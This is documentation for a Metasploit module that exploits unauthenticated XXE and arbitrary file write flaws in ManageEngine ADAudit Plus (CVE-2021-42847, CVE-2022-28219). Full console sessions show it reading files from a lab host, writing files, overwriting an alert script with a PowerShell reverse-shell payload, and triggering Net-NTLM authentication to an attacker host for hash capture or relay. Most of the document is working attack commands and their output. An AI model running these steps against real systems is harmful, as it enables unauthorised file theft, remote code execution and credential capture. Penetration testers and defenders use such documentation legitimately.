## Vulnerable Application
This module exploits unauthenticated XXE (CVE-2021-42847 and CVE-2022-28219) and arbitrary file write (CVE-2021-42847) vulnerabilities
in ManageEngine ADAudit Plus in order to perform a variety of unauthenticated actions including arbitrary file read, arbitrary file write
and triggering Net-NTLM authentication.

The `WRITE_FILE` and `OVERWRITE_ALERT_SCRIPT` actions can be used to target ManageEngine ADAudit Plus builds prior to 7006,
while the remaining actions affect builds prior to 7060 if the `XXE_VECTOR` option is set to `CVE-2022-28219` (default).

If the `XXE_VECTOR` option is set to `CVE-2022-28219` (default), the user needs to provide a valid domain that is monitored
by ADAudit Plus via the `DOMAIN` option.

If the `XXE_VECTOR` option is set to `CVE-2021-42847`, the XXE payload will be executed 4 times when using the `READ_FILE_OR_DIR`,
`LIST_ALERT_SCRIPTS` or `TRIGGER_NTLM_AUTH` actions. This can lead to unexpected results if the selected action
involves multiple XXE triggers and the FTP server has not finished processing duplicate XXE payloads from one trigger
before a second trigger is executed. In order to prevent this, the module comes with the advanced option `cve_2021_42847_sleep_time`.
In case of a slow connection, it may be necessary to increase the default value of `5` for this option in order to prevent issues.

The `LHOST` and `LPORT` options are required if and only if the `WRITE_FILE` or `OVERWRITE_ALERT_SCRIPT` actions have been selected
while the `USE_MSF_PAYLOAD` option is set to `true`, or when using the `TRIGGER_NTLM_AUTH` action.

This module has been successfully tested against ManageEngine ADAudit Plus 7005 running on Windows Server 2012 R2.

## Installation Information
Vulnerable versions of ADAudit Plus are available [here](https://archives2.manageengine.com/active-directory-audit/).

After running the installer, you can launch ADAudit Plus by opening Command Prompt with administrator privileges
and then running: `<install_dir>\bin\run.bat`

## Verification Steps
1. Start msfconsole
2. Do: `use auxiliary/admin/http/manageengine_adaudit_plus_file_read_write`
3. Do: `set RHOSTS [IP]`
4. Do: `set action [action]`
5. Do: `[configure action-specfic options]`
6. Do: `run`

## Actions
### READ_FILE_OR_DIR
Read the contents of a file or directory specified via `FILE_OR_DIR_PATH`.

### WRITE_FILE
Write a JSON-compatible (UTF-8) payload to a file specified via `FILE_OR_DIR_PATH`.
If the `USE_MSF_PAYLOAD` option is set to `true` (default), the module will write the `cmd/windows/powershell_reverse_tcp` payload
to the specified file. This configration requires the `LHOST` option to be set.
Alternatively, if `USE_MSF_PAYLOAD` is set to `false`, the user should provide a custom plaintext payload via the `CUSTOM_PAYLOAD` option.

### LIST_ALERT_SCRIPTS
Locate and list the contents of `<install_dir>/alert_scripts/` if this directory exists.

### OVERWRITE_ALERT_SCRIPT
Overwrite the contents of an existing PowerShell script in `<install_dir>/alert_scripts/` with a payload.
The name of the alert script to overwrite should be specified via the `ALERT_SCRIPT` option.
If the `USE_MSF_PAYLOAD` option is set to `true` (default), the module will write the `cmd/windows/powershell_reverse_tcp` payload
to the specified alert script. This configration requires the `LHOST` option to be set.
Alternatively, if `USE_MSF_PAYLOAD` is set to `false`, the user should provide a custom plaintext payload via the `CUSTOM_PAYLOAD` option.

### TRIGGER_NTLM_AUTH
Trigger Net-NTLM authentication from the target (for hash capture/relaying via Responder/impacket-ntlmrelayx etc.
This action requires the `LHOST` option to be set.
This should point to the system where the user is running a listener for incoming Net-NTLM authentication attempts.

## Options
### DOMAIN
Active Directory domain that the target monitors. This option is required if `XXE_VECTOR` is set to `CVE-2022-28219` (default)

### XXE_VECTOR
The XXE vector to use when using the `READ_FILE_OR_DIR`, `LIST_ALERT_SCRIPTS` or `TRIGGER_NTLM_AUTH` actions.
Two values are supported: `CVE-2022-28219` (default) and `CVE-2021-42847`.

### FILE_OR_DIR_PATH
Path to read from or write to when using the `READ_FILE_OR_DIR` or `WRITE_FILE` actions. The default is `/windows/win.ini`

### ALERT_SCRIPT
The name of an existing PowerShell script in `<install_dir>/alert_scripts/` to overwrite when using the `OVERWRITE_ALERT_SCRIPT` action.

### CUSTOM_PAYLOAD
Custom plaintext payload to use for the `WRITE_FILE` and `OVERWRITE_ALERT_SCRIPT` actions.
This is ignored if `USE_MSF_PAYLOAD` is `true` and required if `USE_MSF_PAYLOAD` is `false`.

### SRVPORT_FTP
Port for FTP reverse connection. Default: `2121`.

### SRVPORT_HTTP2
Port for additional HTTP reverse connections. Default: `8888`.

### USE_MSF_PAYLOAD
Boolean to indicate whether or not the module should use the `cmd/windows/powershell_reverse_tcp` payload
for the `WRITE_FILE` and `OVERWRITE_ALERT_SCRIPT` actions. Default: `true`

### PATH_TRAVERSAL_DEPTH
This is an advanced option for the number of `..\\` to prepend to the path traversal attempt when using `WRITE_FILE`. Default: `20`

### FtpCallbackTimeout
This is an advanced option for the amount of time, in seconds, the FTP server will wait for a reverse connection. Default: `5`

### HttpUploadTimeout
This is an advanced option for the amount of time, in seconds, the HTTP file-upload server will wait for a reverse connection. Default: `5`

### cve_2021_42847_sleep_time
This is an advanced option for the amount of time, in seconds, the module should sleep in between XXE attacks
if `XXE-VECTOR` is set to `CVE-2021-42847`. Default: `5`

## Scenarios
### ManageEngine ADAudit Plus build 7005 running on Windows Server 2012 R2 - READ_FILE_OR_DIR
```
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > options 

Module options (auxiliary/admin/http/manageengine_adaudit_plus_file_read_write):

   Name              Current Setting   Required  Description
   ----              ---------------   --------  -----------
   ALERT_SCRIPT                        no        Name of an existing PowerShell script in /alert_scripts to overwrite when using OVERWRITE_ALERT_SCRIPT
   CUSTOM_PAYLOAD                      no        Custom payload to use for WRITE_FILE and OVERWRITE_ALERT_SCRIPT. Ignored if USE_MSF_PAYLOAD is true
   DOMAIN                              no        Active Directory domain that the target monitors, Required if XXE VECTOR is CVE-2022-28219
   FILE_OR_DIR_PATH  /windows/win.ini  no        Path to read or write to. For read operations this should contain forward slashes and exclude the drive
   LHOST                               no        The local IP address to use for write operations with USE_MSF_PAYLOAD, or for receiving NTLM auth requests (TRIGGER_NTLM_AUTH)
   LOAD_MODULES                        no        A list of powershell modules separated by a comma to download over the web
   LPORT             4444              no        The listening port to use when using USE_MSF_PAYLOAD
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.168.91.250    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             8081              yes       The target port (TCP)
   SRVHOST           192.168.91.195    yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresse
                                                 s.
   SRVPORT           8080              yes       The local port to listen on.
   SRVPORT_FTP       2121              yes       Port for FTP reverse connection
   SRVPORT_HTTP2     8888              yes       Port for additional HTTP reverse connections
   SSL               false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI         /                 yes       The base path to ManageEngine ADAudit Plus
   URIPATH                             no        The URI to use for this exploit (default is random)
   USE_MSF_PAYLOAD   true              no        Use the cmd/windows/powershell_reverse_tcp payload for WRITE_FILE and OVERWRITE_ALERT_SCRIPT.
   VHOST                               no        HTTP server virtual host
   XXE_VECTOR        CVE-2021-42847    no        XXE vector for obtaining file contents/directory listings (CVE-2022-28219 or CVE-2021-42847)


Auxiliary action:

   Name              Description
   ----              -----------
   READ_FILE_OR_DIR  Read the contents of a file or directory specified via FILE_OR_DIR_PATH


msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set FILE_OR_DIR_PATH /users/
FILE_OR_DIR_PATH => /users/
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Getting contents for /users/ via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/lREPlWhKGqjI.dtd
[+] Received the following contents for /users/:
Administrator
All Users
Default
Default User
desktop.ini
karen
Public
[*] Server stopped.
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set FILE_OR_DIR_PATH /users/karen/
FILE_OR_DIR_PATH => /users/karen/
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Getting contents for /users/karen/ via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/TSFkWlLFTdd.dtd
[+] Received the following contents for /users/karen/:
secret.txt
[*] Server stopped.
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set FILE_OR_DIR_PATH /users/karen/secret.txt
FILE_OR_DIR_PATH => /users/karen/secret.txt
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Getting contents for /users/karen/secret.txt via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/BhCFXqLZayD.dtd
[+] Received the following contents for /users/karen/secret.txt:
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you

```

### ManageEngine ADAudit Plus build 7005 running on Windows Server 2012 R2 - WRITE_FILE
```
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set action WRITE_FILE 
action => WRITE_FILE
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set FILE_OR_DIR_PATH /users/karen/pwned.txt
FILE_OR_DIR_PATH => /users/karen/pwned.txt
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set use_msf_payload false
use_msf_payload => false
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set custom_payload wynter was here
custom_payload => wynter was here
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > options 

Module options (auxiliary/admin/http/manageengine_adaudit_plus_file_read_write):

   Name              Current Setting         Required  Description
   ----              ---------------         --------  -----------
   ALERT_SCRIPT                              no        Name of an existing PowerShell script in /alert_scripts to overwrite when using OVERWRITE_ALERT_SCRIPT
   CUSTOM_PAYLOAD    wynter was here         no        Custom payload to use for WRITE_FILE and OVERWRITE_ALERT_SCRIPT. Ignored if USE_MSF_PAYLOAD is true
   DOMAIN                                    no        Active Directory domain that the target monitors, Required if XXE VECTOR is CVE-2022-28219
   FILE_OR_DIR_PATH  /users/karen/pwned.txt  no        Path to read or write to. For read operations this should contain forward slashes and exclude the drive
   LHOST                                     no        The local IP address to use for write operations with USE_MSF_PAYLOAD, or for receiving NTLM auth requests (TRIGGER_NTLM_AUTH
                                                       )
   LOAD_MODULES                              no        A list of powershell modules separated by a comma to download over the web
   LPORT             4444                    no        The listening port to use when using USE_MSF_PAYLOAD
   Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.168.91.250          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             8081                    yes       The target port (TCP)
   SRVHOST           192.168.91.195          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all ad
                                                       dresses.
   SRVPORT           8080                    yes       The local port to listen on.
   SRVPORT_FTP       2121                    yes       Port for FTP reverse connection
   SRVPORT_HTTP2     8888                    yes       Port for additional HTTP reverse connections
   SSL               false                   no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                   no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI         /                       yes       The base path to ManageEngine ADAudit Plus
   URIPATH                                   no        The URI to use for this exploit (default is random)
   USE_MSF_PAYLOAD   false                   no        Use the cmd/windows/powershell_reverse_tcp payload for WRITE_FILE and OVERWRITE_ALERT_SCRIPT.
   VHOST                                     no        HTTP server virtual host
   XXE_VECTOR        CVE-2021-42847          no        XXE vector for obtaining file contents/directory listings (CVE-2022-28219 or CVE-2021-42847)


Auxiliary action:

   Name        Description
   ----        -----------
   WRITE_FILE  Write a JSON-compatible (UTF-8) payload to a file specified via FILE_OR_DIR_PATH


msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Attempting to write the payload to 
[+] Successfully uploaded the payload
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > set action READ_FILE_OR_DIR 
action => READ_FILE_OR_DIR
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Getting contents for /users/karen/pwned.txt via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/IaLexyrHsSlcg.dtd
[+] Received the following contents for /users/karen/pwned.txt:
wynter was here
[*] Server stopped.
[*] Auxiliary module execution completed

```

### ManageEngine ADAudit Plus build 7005 running on Windows Server 2012 R2 - LIST_ALERT_SCRIPTS
```
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > options 

Module options (auxiliary/admin/http/manageengine_adaudit_plus_file_read_write):

   Name              Current Setting   Required  Description
   ----              ---------------   --------  -----------
   ALERT_SCRIPT                        no        Name of an existing PowerShell script in /alert_scripts to overwrite when using OVERWRITE_ALERT_SCRIPT
   CUSTOM_PAYLOAD                      no        Custom payload to use for WRITE_FILE and OVERWRITE_ALERT_SCRIPT. Ignored if USE_MSF_PAYLOAD is true
   DOMAIN                              no        Active Directory domain that the target monitors, Required if XXE VECTOR is CVE-2022-28219
   FILE_OR_DIR_PATH  /windows/win.ini  no        Path to read or write to. For read operations this should contain forward slashes and exclude the drive
   LHOST                               no        The local IP address to use for write operations with USE_MSF_PAYLOAD, or for receiving NTLM auth requests (TRIGGER_NTLM_AUTH)
   LOAD_MODULES                        no        A list of powershell modules separated by a comma to download over the web
   LPORT             4444              no        The listening port to use when using USE_MSF_PAYLOAD
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.168.91.250    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             8081              yes       The target port (TCP)
   SRVHOST           192.168.91.195    yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresse
                                                 s.
   SRVPORT           8080              yes       The local port to listen on.
   SRVPORT_FTP       2121              yes       Port for FTP reverse connection
   SRVPORT_HTTP2     8888              yes       Port for additional HTTP reverse connections
   SSL               false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI         /                 yes       The base path to ManageEngine ADAudit Plus
   URIPATH                             no        The URI to use for this exploit (default is random)
   USE_MSF_PAYLOAD   true              no        Use the cmd/windows/powershell_reverse_tcp payload for WRITE_FILE and OVERWRITE_ALERT_SCRIPT.
   VHOST                               no        HTTP server virtual host
   XXE_VECTOR        CVE-2021-42847    no        XXE vector for obtaining file contents/directory listings (CVE-2022-28219 or CVE-2021-42847)


Auxiliary action:

   Name                Description
   ----                -----------
   LIST_ALERT_SCRIPTS  Locate and list the contents of alert_scripts/ in the ADAudit Plus install directory


msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Getting contents for /Program Files/ManageEngine/ADAudit Plus/ via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/WFcOjOdALpjc.dtd
[*] Found the ADAudit Plus installation folder at /Program Files/ManageEngine/ADAudit Plus/.
[*] XXE_VECTOR is CVE-2021-42847. Sleeping 5 seconds before proceeding to ensure the duplicate requests for /Program Files/ManageEngine/ADAudit Plus/ have been processed
[*] Checking for existing alert scripts at /Program Files/ManageEngine/ADAudit Plus/alert_scripts/
[*] Getting contents for /Program Files/ManageEngine/ADAudit Plus/alert_scripts/ via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/SSZaswSACXsRnu.dtd
[+] Found 1 PowerShell script(s) in /alert_scripts/:
user_lockout.ps1
[*] You can overwrite any PowerShell script with a PSH reverse shell via OVERWRITE_ALERT_SCRIPT together with USE_MSF_PAYLOAD
[*] Auxiliary module execution completed
```

### OVERWRITE_ALERT_SCRIPT
```
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > options 

Module options (auxiliary/admin/http/manageengine_adaudit_plus_file_read_write):

   Name              Current Setting   Required  Description
   ----              ---------------   --------  -----------
   ALERT_SCRIPT      user_lockout.ps1  no        Name of an existing PowerShell script in /alert_scripts to overwrite when using OVERWRITE_ALERT_SCRIPT
   CUSTOM_PAYLOAD                      no        Custom payload to use for WRITE_FILE and OVERWRITE_ALERT_SCRIPT. Ignored if USE_MSF_PAYLOAD is true
   DOMAIN                              no        Active Directory domain that the target monitors, Required if XXE VECTOR is CVE-2022-28219
   FILE_OR_DIR_PATH  /windows/win.ini  no        Path to read or write to. For read operations this should contain forward slashes and exclude the drive
   LHOST             192.168.91.195    no        The local IP address to use for write operations with USE_MSF_PAYLOAD, or for receiving NTLM auth requests (TRIGGER_NTLM_AUTH)
   LOAD_MODULES                        no        A list of powershell modules separated by a comma to download over the web
   LPORT             4444              no        The listening port to use when using USE_MSF_PAYLOAD
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.168.91.250    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             8081              yes       The target port (TCP)
   SRVHOST           192.168.91.195    yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresse
                                                 s.
   SRVPORT           8080              yes       The local port to listen on.
   SRVPORT_FTP       2121              yes       Port for FTP reverse connection
   SRVPORT_HTTP2     8888              yes       Port for additional HTTP reverse connections
   SSL               false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI         /                 yes       The base path to ManageEngine ADAudit Plus
   URIPATH                             no        The URI to use for this exploit (default is random)
   USE_MSF_PAYLOAD   true              no        Use the cmd/windows/powershell_reverse_tcp payload for WRITE_FILE and OVERWRITE_ALERT_SCRIPT.
   VHOST                               no        HTTP server virtual host
   XXE_VECTOR        CVE-2021-42847    no        XXE vector for obtaining file contents/directory listings (CVE-2022-28219 or CVE-2021-42847)


Auxiliary action:

   Name                    Description
   ----                    -----------
   OVERWRITE_ALERT_SCRIPT  Overwrite the contents of an existing PowerShell script in alert_scripts/ with a payload


msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Performing sanity check to see if user_lockout.ps1 exists...
[*] Getting contents for /Program Files/ManageEngine/ADAudit Plus/ via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/wOmkRtXagck.dtd
[*] Found the ADAudit Plus installation folder at /Program Files/ManageEngine/ADAudit Plus/.
[*] XXE_VECTOR is CVE-2021-42847. Sleeping 5 seconds before proceeding to ensure the duplicate requests for /Program Files/ManageEngine/ADAudit Plus/ have been processed
[*] Checking for existing alert scripts at /Program Files/ManageEngine/ADAudit Plus/alert_scripts/
[*] Getting contents for /Program Files/ManageEngine/ADAudit Plus/alert_scripts/ via XXE and FTP
[*] Using URL: http://192.168.91.195:8080/AnjjjwMR.dtd
[*] Confirmed that user_lockout.ps1 exists in /alert_scripts
[*] Attempting to overwrite the alert script user_lockout.ps1 with the payload
[+] Successfully wrote the payload to user_lockout.ps1
[*] Auxiliary module execution completed
```

### TRIGGER_NTLM_AUTH
```
msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > options 

Module options (auxiliary/admin/http/manageengine_adaudit_plus_file_read_write):

   Name              Current Setting   Required  Description
   ----              ---------------   --------  -----------
   ALERT_SCRIPT                        no        Name of an existing PowerShell script in /alert_scripts to overwrite when using OVERWRITE_ALERT_SCRIPT
   CUSTOM_PAYLOAD                      no        Custom payload to use for WRITE_FILE and OVERWRITE_ALERT_SCRIPT. Ignored if USE_MSF_PAYLOAD is true
   DOMAIN                              no        Active Directory domain that the target monitors, Required if XXE VECTOR is CVE-2022-28219
   FILE_OR_DIR_PATH  /windows/win.ini  no        Path to read or write to. For read operations this should contain forward slashes and exclude the drive
   LHOST             192.168.91.195    no        The local IP address to use for write operations with USE_MSF_PAYLOAD, or for receiving NTLM auth requests (TRIGGER_NTLM_AUTH)
   LOAD_MODULES                        no        A list of powershell modules separated by a comma to download over the web
   LPORT             4444              no        The listening port to use when using USE_MSF_PAYLOAD
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.168.91.250    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             8081              yes       The target port (TCP)
   SRVHOST           192.168.91.195    yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresse
                                                 s.
   SRVPORT           8080              yes       The local port to listen on.
   SRVPORT_FTP       2121              yes       Port for FTP reverse connection
   SRVPORT_HTTP2     8888              yes       Port for additional HTTP reverse connections
   SSL               false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI         /                 yes       The base path to ManageEngine ADAudit Plus
   URIPATH                             no        The URI to use for this exploit (default is random)
   USE_MSF_PAYLOAD   true              no        Use the cmd/windows/powershell_reverse_tcp payload for WRITE_FILE and OVERWRITE_ALERT_SCRIPT.
   VHOST                               no        HTTP server virtual host
   XXE_VECTOR        CVE-2021-42847    no        XXE vector for obtaining file contents/directory listings (CVE-2022-28219 or CVE-2021-42847)


Auxiliary action:

   Name               Description
   ----               -----------
   TRIGGER_NTLM_AUTH  Trigger Net-NTLM authentication from the target (for hash capture/relaying via Responder/impacket-ntlmrelayx etc)


msf6 auxiliary(admin/http/manageengine_adaudit_plus_file_read_write) > run
[*] Running module against 192.168.91.250

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The vulnerable endpoint /api/agent/tabs/agentGPOWatcherData is available and responds with HTTP/200
[*] Triggering Net-NTLM authentication from the target to http://192.168.91.195
[*] Auxiliary module execution completed
```
